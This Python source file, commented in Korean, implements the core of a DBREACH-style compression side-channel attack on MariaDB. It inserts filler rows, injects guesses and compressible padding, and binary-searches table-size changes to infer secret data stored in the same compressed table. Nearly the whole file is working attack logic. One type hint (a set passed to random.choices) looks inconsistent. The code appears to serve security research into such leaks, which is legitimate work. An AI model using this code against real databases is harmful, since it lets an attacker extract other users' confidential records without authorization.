# dbreacher_impl_binary_search.py
import random
from typing import Optional

import utils.mariadb_utils as utils
import dbreacher


class DBREACHerImpl(dbreacher.DBREACHer):
    """
    안정화 포인트
    - insertFillers():
        * 성장(ibd 할당 증가) 전에는 순수 랜덤 filler만 삽입해 실제로 크기가 늘도록 함
        * filler 부족 시 동적으로 증설 (_ensure_more_fillers)
        * 첫 삽입 후 곧바로 성장하면 원복/False 반환해 상위 setUp 재시도
        * 성장 확인 후 마지막 행에만 압축 부트스트랩 보정 적용
    - reinsertFillers():
        * rowsAdded 범위 off-by-one 수정
    - utils.get_compressible_str(char=...), controller.get_table_size() 사용 가정
    """

    def __init__(
        self,
        controller: utils.MariaDBController,
        tablename: str,
        startIdx: int,
        maxRowSize: int,
        fillerCharSet: set,
        compressCharAscii: int,
        compressible_bytes: int,
        random_bytes: int,
        guesses: list[str],
        random_guess_len: int,
    ):
        super().__init__(controller, tablename, startIdx, maxRowSize, fillerCharSet, compressCharAscii)

        self.compressibilityScoreReady: bool = False
        self.bytesShrunkForCurrentGuess: int = 0
        self.bytesShrunkForBeforeGuess: int = 0
        self.rowsAdded: int = 0
        self.rowsChanged: list[bool] = [False, False, False, False]
        self.fillersInserted: bool = False
        self.db_count: int = 0
        self.previously_shrunk: bool = False

        self.compressible_bytes: int = int(compressible_bytes)
        self.random_bytes: int = int(random_bytes)
        self.guesses = guesses
        self.random_guess_len: int = int(random_guess_len)
        self.maxRowSize: int = int(maxRowSize)

    # ----------------------------------------------------------------------
    # Helpers
    # ----------------------------------------------------------------------
    def _ensure_fillers(self) -> int:
        """self.fillers 없으면 최소 개수(기본 200) 생성하고 개수 반환"""
        if not hasattr(self, "fillers") or not self.fillers:
            n = int(getattr(self, "numFillerRows", 200))
            self.fillers = [
                ''.join(random.choices(self.fillerCharSet, k=self.maxRowSize))
                for _ in range(n)
            ]
        return len(self.fillers)

    def _ensure_more_fillers(self, need_upto_index: int):
        """fillers[need_upto_index]에 접근 가능하도록 부족분을 동적 생성"""
        cur = len(self.fillers)
        if need_upto_index < cur:
            return
        target = need_upto_index + 1
        chunk = max(512, target - cur)  # 한 번에 여유 있게 채움
        self.fillers.extend(
            ''.join(random.choices(self.fillerCharSet, k=self.maxRowSize))
            for _ in range(chunk)
        )

    def _tail(self, s: str, off: int) -> str:
        return s[off:] if off < len(s) else ""

    # ----------------------------------------------------------------------
    # Pipeline
    # ----------------------------------------------------------------------
    def reinsertFillers(self) -> bool:
        self.compressibilityScoreReady = False
        if self.fillersInserted and self.rowsAdded > 0:
            end_row = self.startIdx + self.rowsAdded
            comp_str = utils.get_compressible_str(self.compressible_bytes, char=self.compressChar)

            for row in range(self.startIdx, end_row):
                self.control.update_row(self.table, row, comp_str)
                self.db_count += 1

            for row in range(self.startIdx, end_row):
                self.control.delete_row(self.table, row)
                self.db_count += 1

            self.bytesShrunkForCurrentGuess = 0
            self.rowsAdded = 0
            self.previously_shrunk = False
            self.fillersInserted = False

        return self.insertFillers()

    def insertFillers(self) -> bool:
        self.fillersInserted = True
        oldSize = self.control.get_table_size(self.table)

        # 0) filler 보장
        num_fillers = self._ensure_fillers()
        if num_fillers == 0:
            self.fillersInserted = False
            return False

        # 1) 첫 행(guess용) 삽입
        try:
            self.control.insert_row(self.table, self.startIdx, self.fillers[0])
        except Exception as e:
            print(f"[ERROR] insert first filler at {self.startIdx}: {e}")
            self.fillersInserted = False
            return False

        self.db_count += 1
        self.rowsAdded = 1

        newSize = self.control.get_table_size(self.table)
        if newSize > oldSize:
            # 기준 위반 → 되돌리고 상위 setUp 재시도
            try:
                self.control.delete_row(self.table, self.startIdx)
            except Exception:
                pass
            self.db_count += 1
            self.rowsAdded = 0
            self.fillersInserted = False
            return False

        # 2) 성장(할당 증가) 전에는 '순수 랜덤 filler'만 계속 삽입
        MAX_TRIES = 20000  # 안전 상한
        tries = 0
        i = 1
        while newSize <= oldSize:
            tries += 1
            if tries > MAX_TRIES:
                # 환경/튜닝 이슈 → 상위 setUp에서 재시도하게 False
                return False

            # 부족하면 동적 확장
            if i >= len(self.fillers):
                self._ensure_more_fillers(i)

            payload = self.fillers[i]  # ★ 압축 부트스트랩 적용 금지(순수 랜덤)
            try:
                self.control.insert_row(self.table, self.startIdx + i, payload)
            except Exception as e:
                print(f"[ERROR] insert filler i={i} at row {self.startIdx + i}: {e}")
                return False

            self.db_count += 1
            newSize = self.control.get_table_size(self.table)
            i += 1
            self.rowsAdded += 1

        # 여기 도달 = 성장 확인
        self.rowsChanged = [False, False, False, False]

        # 3) guess 전 바이너리 서치(첫 번째)로 보정량 계산
        refGuess = "*" * self.compressible_bytes + ''.join(random.choices(self.fillerCharSet, k=self.random_bytes))
        self.addCompressibleByteAndCheckIfShrunkBeforeGuess(refGuess, 0, self.random_bytes)

        # 4) 마지막 행(가장 최근 삽입)에 압축 부트스트랩 보정 적용
        last_idx = self.startIdx + self.rowsAdded - 1
        comp_len = max(0, self.compressible_bytes + self.bytesShrunkForBeforeGuess - self.random_guess_len)
        comp_str = utils.get_compressible_str(comp_len, char=self.compressChar)
        tail = self._tail(self.fillers[self.rowsAdded - 1], len(comp_str))
        try:
            self.control.update_row(self.table, last_idx, comp_str + tail)
        except Exception as e:
            print(f"[ERROR] update last filler row {last_idx}: {e}")
            return False

        return True

    # ----------------------------------------------------------------------
    # Guess Phase
    # ----------------------------------------------------------------------
    def insertGuessAndCheckIfShrunk(self, guess: str) -> bool:
        # guess 전 마지막 filler 원복
        last_idx = self.startIdx + self.rowsAdded - 1
        comp_len = max(0, self.compressible_bytes + self.bytesShrunkForBeforeGuess - self.random_guess_len)
        comp_str = utils.get_compressible_str(comp_len, char=self.compressChar)
        tail = self._tail(self.fillers[self.rowsAdded - 1], len(comp_str))
        self.control.update_row(self.table, last_idx, comp_str + tail)

        self.compressibilityScoreReady = False
        self.previously_shrunk = False

        old_size = self.control.get_table_size(self.table)

        # 첫 행에 guess 반영
        new_first_row = guess + self._tail(self.fillers[0], len(guess))
        if new_first_row != self.fillers[0]:
            self.control.update_row(self.table, self.startIdx, new_first_row)
            self.db_count += 1
            self.rowsChanged[0] = True

        new_size = self.control.get_table_size(self.table)
        return new_size < old_size

    def getSNoReferenceScore(self, length: int, charSet) -> float:
        refGuess = ''.join(random.choices(charSet, k=length))
        shrunk = self.insertGuessAndCheckIfShrunk(refGuess)
        if shrunk:
            return 0.0
        while not shrunk:
            shrunk = self.addCompressibleByteAndCheckIfShrunk(refGuess)
        if self.getBytesShrunkForCurrentGuess() == 100:
            shrunk = False
            while not shrunk:
                shrunk = self.addCompressibleByteAndCheckIfShrunk(refGuess, 100, 200)
        return float(self.getBytesShrunkForCurrentGuess())

    def getSYesReferenceScore(self, length: int) -> float:
        refGuess = self._tail(self.fillers[1], self.compressible_bytes)[:length]
        shrunk = self.insertGuessAndCheckIfShrunk(refGuess)
        if shrunk:
            return 0.0
        while not shrunk:
            shrunk = self.addCompressibleByteAndCheckIfShrunk(refGuess)
        return float(self.getBytesShrunkForCurrentGuess())

    # ----------------------------------------------------------------------
    # Binary Searches
    # ----------------------------------------------------------------------
    def addCompressibleByteAndCheckIfShrunk(self, refGuess, lowBytes: int = 0, highBytes: Optional[int] = None) -> bool:
        if highBytes is None:
            highBytes = self.random_guess_len
        while highBytes >= lowBytes:
            midBytes = (lowBytes + highBytes) // 2
            self.bytesShrunkForCurrentGuess = midBytes
            shrunk = self.checkIfShrunk(midBytes)
            if shrunk:
                highBytes = midBytes - 1
            else:
                lowBytes = midBytes + 1
        self.compressibilityScoreReady = True
        return True

    def addCompressibleByteAndCheckIfShrunkBeforeGuess(self, refGuess, lowBytes: int = 0, highBytes: Optional[int] = None) -> bool:
        if highBytes is None:
            highBytes = self.random_bytes
        while highBytes >= lowBytes:
            midBytes = (lowBytes + highBytes) // 2
            self.bytesShrunkForBeforeGuess = midBytes
            shrunk = self.checkIfShrunkBeforeGuess(midBytes)
            if shrunk:
                highBytes = midBytes - 1
            else:
                lowBytes = midBytes + 1
        self.compressibilityScoreReady = True
        return True

    # ----------------------------------------------------------------------
    # Shrink Checks
    # ----------------------------------------------------------------------
    def checkIfShrunk(self, bytesShrunkForCurrentGuess: int) -> bool:
        old_size = self.control.get_table_size(self.table)
        if bytesShrunkForCurrentGuess > self.maxRowSize:
            raise RuntimeError("checkIfShrunk: bytesShrunkForCurrentGuess > maxRowSize")

        comp_len = max(
            0,
            self.compressible_bytes
            + self.bytesShrunkForBeforeGuess
            - self.random_guess_len
            + bytesShrunkForCurrentGuess
        )
        comp_str = utils.get_compressible_str(comp_len, char=self.compressChar)

        last_idx = self.startIdx + self.rowsAdded - 1
        tail = self._tail(self.fillers[self.rowsAdded - 1], len(comp_str))
        self.control.update_row(self.table, last_idx, comp_str + tail)
        self.db_count += 1

        new_size = self.control.get_table_size(self.table)
        if new_size < old_size or (new_size == old_size and self.previously_shrunk):
            self.compressibilityScoreReady = True
            self.previously_shrunk = True
            return True
        self.previously_shrunk = False
        return False

    def checkIfShrunkBeforeGuess(self, bytesShrunkForBeforeGuess: int) -> bool:
        old_size = self.control.get_table_size(self.table)
        if bytesShrunkForBeforeGuess > self.random_bytes:
            raise RuntimeError("checkIfShrunkBeforeGuess: bytesShrunkForBeforeGuess > random_bytes")

        comp_len = max(0, self.compressible_bytes + bytesShrunkForBeforeGuess)
        comp_str = utils.get_compressible_str(comp_len, char=self.compressChar)

        last_idx = self.startIdx + self.rowsAdded - 1
        tail = self._tail(self.fillers[self.rowsAdded - 1], len(comp_str))
        self.control.update_row(self.table, last_idx, comp_str + tail)
        self.db_count += 1

        new_size = self.control.get_table_size(self.table)
        if new_size < old_size or (new_size == old_size and self.previously_shrunk):
            self.compressibilityScoreReady = True
            self.previously_shrunk = True
            return True
        self.previously_shrunk = False
        return False

    # ----------------------------------------------------------------------
    # Accessors
    # ----------------------------------------------------------------------
    def getCompressibilityScoreOfCurrentGuess(self) -> Optional[float]:
        if self.compressibilityScoreReady and self.bytesShrunkForCurrentGuess > 0:
            return 1.0 / float(self.bytesShrunkForCurrentGuess)
        return None

    def getBytesShrunkForCurrentGuess(self) -> Optional[int]:
        if self.compressibilityScoreReady:
            return int(self.bytesShrunkForCurrentGuess)
        return None
